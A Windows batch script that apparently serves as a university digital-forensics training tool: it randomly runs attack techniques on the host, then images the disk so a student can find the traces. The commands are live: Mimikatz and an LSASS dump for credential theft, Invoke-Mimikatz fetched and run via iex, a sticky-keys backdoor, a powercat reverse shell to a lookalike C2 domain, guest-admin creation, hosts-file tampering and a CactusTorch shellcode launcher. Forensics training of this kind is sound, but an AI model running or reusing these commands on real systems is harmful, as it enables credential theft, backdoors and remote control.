@echo off

setlocal EnableDelayedExpansion

ECHO The purpose of the research is to develop a program which aims to develop users' skills in digital forensics.  
echo The research project is being conducted by Amelia Buck at Coventry University. 
echo You can opt out at any stage by closing this program. 
echo -----------------------
echo It is recommended that this program be ran on an isolated machine.

call :yesorno 

::CDIR = drive letter and path of this batch file
SET CDIR=%~dp0
cd %CDIR%

SET CURL=%CDIR%helpers\curl.exe

::Choose output directory
Set /A RANDOMNUMBER= %RANDOM% * (3-1+1) / 32768 + 1
 
::Choose folder based on random number 1 to save any files 
if %RANDOMNUMBER%==1 (
  Set OUTPUTDIR=C:\Users\Public) 
if %RANDOMNUMBER%==2 (
  SET OUTPUTDIR=C:\Users\Public\Documents)

if %RANDOMNUMBER%==3 (
  SET OUTPUTDIR=C:\temp)

::Choosing functions to run randomly

::choose a recon
set arr[0]=RECON
set arr[1]=NETBIOS

::Random Modulo 2 gives a random number 0-1
Set /A RANDOMNUMBER2= (%RANDOM% %%2) 
::Calling task based on number produced
call :!arr[%RANDOMNUMBER2%]! %CDIR% , %OUTPUTDIR%

::choose 2 exploits
set arr1[0]=MIMIKATZ
set arr1[1]=LSASS
set arr1[2]=CACTUSTORCH
set arr1[3]=EVENTLOG

::returns two different random numbers in range 0-3
call :tworandomnumbers 4
::Calls the task based on those 2 numbers
call :!arr1[%RANDOMNUMBER3%]! %CDIR% , %OUTPUTDIR%
call :!arr1[%RANDOMNUMBER4%]! %CDIR% , %OUTPUTDIR%

::Choose 2 post exploits
set arr2[0]=STICKYKEYSBACKDOOR
set arr2[1]=NETCAT
set arr2[2]=C2SERVERACCESS
set arr2[3]=MALICIOUSUA
set arr2[4]=GUESTUSER
set arr2[5]=SUSFILELOCATION
set arr2[6]=HOSTSFILE

::returns two different random numbers in range 0-6
call :tworandomnumbers 7

::Calls the task based on those 2 numbers
call :!arr2[%RANDOMNUMBER3%]! %CDIR% , %OUTPUTDIR% , %CURL%
call :!arr2[%RANDOMNUMBER4%]! %CDIR% , %OUTPUTDIR% , %CURL%

::taking image after exploits are done
call :IMAGE

::Shows user where to find answers
echo After your analysis of the image created please refer to %CDIR%answer.txt to check your answers. 
pause 

::Ends program
goto :EOF
::----------------------------
:tworandomnumbers
::creates two random numbers
Set /A RANDOMNUMBER3= %RANDOM% %% %~1
Set /A RANDOMNUMBER4= %RANDOM% %% %~1
::if the two numbers are equal, then repeat
if %RANDOMNUMBER3% EQU %RANDOMNUMBER4% (
  goto :tworandomnumbers)
::exits when the rwo random numbers dont equal each other
exit /b 0
::----------------------------
:yesorno
::Asks malicious message
Set /P choice="Is this use of this script compliant with social legal and ethical framework in your country?[y/n] "
::if n continue program
if "%choice%" EQU "y" (
  exit /b 0
)
::if y exit
if "%choice%" EQU "n" (
  call :ErrorExit 2> nul
) else (
::if neither y or n ask again
echo Please input y or n
call :yesorno
)
exit /b 0
::-----------------------------
:ErrorExit
::Creates a syntax error, stops immediately
()

goto :EOF
::----------------------------
:RECON
echo "recon {whoami, systeminfo, admins stored in sys.txt}" > "%~1answer.txt"

::General Recon commands
whoami > "%~2\sys.txt"
systeminfo >> "%~2\sys.txt"
net localgroup administrators >> "%~2\sys.txt"
wmic qfe list full >> "%~2\sys.txt"
wmic share get >> "%~2\sys.txt"

exit /b 0
::----------------------------
:NETBIOS
echo "netbios scan of private addresses" > "%~1answer.txt"

::change so it scans something not relevant
::Scans network for open nameservers
"%~1toolset\nbtscan.exe" 192.168.1.1/30 > "%~2\scan1.tmp" 2> nul
"%~1toolset\nbtscan.exe" 10.10.0.0/30 > "%~2\scan2.tmp" 2> nul
"%~1toolset\nbtscan.exe" 172.28.29.0/30 > "%~2\scan3.tmp" 2> nul 

exit /b 0
::----------------------------
:MIMIKATZ
echo "mimikatz custom executable in memory and saving to output, and running Invoke-Mimikatz from github" >> "%~1answer.txt"

::Run mim.exe and output in mim-out
"%~1toolset\mim.exe" > "%~2\mim-out.tmp"
::Download invoke-Mimikatz and run it
powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> "%~2\mim-out.tmp" 2> nul 

exit /b 0
::-----------------------------
:LSASS
echo "Dumping LSASS with ProcDump to lsassdump.dmp" >> "%~1answer.txt"

::Memory dump of lsass.exe
"%~1toolset\procdump64.exe" -accepteula -ma lsass.exe "%~2\lsassdump.dmp" 2> nul 

exit /b 0
::-----------------------------
:EVENTLOG
echo "Event Logs indicating use of password dumpers, WCESERVICE installed and ran" >> "%~1answer.txt"

::Creating event logs
eventcreate /L System /T Success /ID 100 /D "A service was installed in the system. Service Name:  WCESERVICE Service File Name:  C:\Users\neo\AppData\Local\Temp\0c134c70-2b4d-4cb3-beed-37c5fa0451d0.exe -S Service Type:  user mode service Service Start Type:  demand start Service Account:  LocalSystem"  
eventcreate /L System /T Success /ID 101 /D "The WCESERVICE service entered the running state."  

exit /b 0
::-----------------------------
:STICKYKEYSBACKDOOR
echo "Sticky key backdoor Replacement of sethc.exe / Debugger registration" >> "%~1answer.txt"

::create a backup of sethc.exe
COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck 2> nul
::add cmd.exe as the debugger for sethc.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

exit /b 0
::-----------------------------
:NETCAT
echo "Powershell netcat alternative connecting outwards" >> "%~1answer.txt"

::Connecting powercat outwards
powershell -Exec Bypass ". \"%~1toolset\nc.ps1\";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd" 2> nul 

exit /b 0
::-----------------------------
:C2SERVERACCESS
echo "Curling to well-known C2 addresses" >> "%~1answer.txt"

::Using curl to access well-known C2 addresses
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 msupdater.com 2> nul 
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 freenow.chickenkiller.com 2> nul 

::Creating DNS Cache entries for well-known malicious C2 servers
nslookup msupdater.com 1> NUL
nslookup twitterdocs.com 1> NUL
nslookup freenow.chickenkiller.com 1> NUL
nslookup www.googleaccountsservices.com 1> NUL

exit /b 0
::-----------------------------
:MALICIOUSUA
echo "Malicious User Agents to access web sites" >> "%~1answer.txt"

::Uses malicous user agents to connect to google
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "HttpBrowser/1.0" -m3 www.google.com
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
"%~3" -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "*<|>*" -m3 www.google.com

exit /b 0
::-----------------------------
:GUESTUSER
echo "Guest Admin account created" >> "%~1answer.txt"

::Create guest
net user guest /active:yes 2> nul 
::Add guest to admin group
net localgroup administrators guest /ADD 2> nul 

exit /b 0
::-----------------------------
:SUSFILELOCATION
echo "svchost running in Public directory" >> "%~1answer.txt"

::Copying and running svchost
copy %~1toolset\svchost.exe %PUBLIC%
"%PUBLIC%\svchost.exe"

exit /b 0
::-----------------------------
:HOSTSFILE
echo "Modifying the hosts file, where websites are mapped to private IP addresses" >> "%~1answer.txt"

::Mapping public domains to private IPs
ECHO 10.2.2.2 update.microsoft.com >> %SYSTEMROOT%\System32\drivers\etc\hosts 
ECHO 127.0.0.1  www.virustotal.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  www.www.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  dci.sophosupd.com >> %SYSTEMROOT%\System32\drivers\etc\hosts

exit /b 0
::-----------------------------
:CACTUSTORCH
echo "Using certutil to drop a cactus torch shellcode lanucher into rundll32.exe" >> "%~1answer.txt"

::import javascript fix into registry
reg import "%~1toolset\jsfix.reg"
::copy tool into output dir
copy %~1toolset\cactus.js %~2\en-US.js
::run if it exists
IF EXIST %~2\en-US.js start /B cmd /c wscript.exe %~2\en-US.js 2> nul 

exit /b 0
::-----------------------------
:IMAGE
echo Please see below a list of available drives:
.\ftkimager --list-drives

::New line creation for inputs
set NLM=^


set NL=^^^%NLM%%NLM%^%NLM%%NLM%
Set /p DISKNAME=Which disk do you need to analyze? Hint you need to select the disk which includes Windows files %NL%

::ftkimager "%DISKNAME%" /Desktop --e01 --compress 3 --verify

exit /b 0